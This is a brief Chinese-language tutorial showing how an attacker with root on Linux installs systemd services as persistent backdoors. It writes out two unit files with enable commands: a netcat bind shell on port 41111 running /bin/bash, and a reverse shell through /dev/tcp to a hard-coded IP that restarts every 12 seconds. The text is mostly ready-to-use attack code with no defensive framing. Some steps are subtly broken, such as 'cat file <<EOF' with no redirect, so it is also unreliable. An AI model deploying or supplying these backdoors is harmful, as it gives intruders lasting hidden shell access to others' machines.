systemd后门是一种自启动服务后门。顾名思义能够在操作系统启动后自动运行的脚本或命令。Linux下关于自启动管理最常见的是使用systemd、init.d，前者是后者的替代，目前已经默认启用于大多数Linux发行版中。

攻击者获得主机root权限后，可以在自启动脚本目录部署自己的自启动服务，达到每次开机就运行的目的。

下面给出几个简单的自启动服务例子。

## 例子1 系统重启开bindshell后门

```shell
cat /usr/lib/systemd/system/backdoor.service <<EOF
[Unit]
Description=Just a simple backdoor for test
After=network.target
[Service]
Type=forking
ExecStart=bash -c "nc -l -p 41111 -e /bin/bash &"
ExecReload=
ExecStop=
PrivateTmp=true
[Install]
WantedBy=multi-user.target

EOF
```

准备好以上的服务配置文件后，开始启用该配置

```shell
systemctl daemon-reload
systemctl enable backdoor #启用该配置，重启后开后门
systemctl start backdoor #启动该配置，立刻会开后门


nc 192.168.44.130 41111
```



## 例子2 创建类定时任务后门

下面的后门在实际场景下具有定时任务一样的特点，只要反弹shell不成功，该服务每个12s就会重新发起尝试。

```shell
cat /usr/lib/systemd/system/guard.service <<EOF
[Unit]
Description=guard
After=network.target

[Service]
Type=forking
ExecStart=/bin/bash -i > /dev/tcp/192.168.44.88/8080 0<&1 2>&1
Restart=always
RestartSec=12s

[Install]
WantedBy=default.target

EOF
```

准备好以上的服务配置文件后，开始启用该配置

```shell
systemctl daemon-reload
systemctl enable guard #启用该配置，重启后开后门
systemctl start guard #启动该配置，立刻会开后门


nc -lvvp 8080
```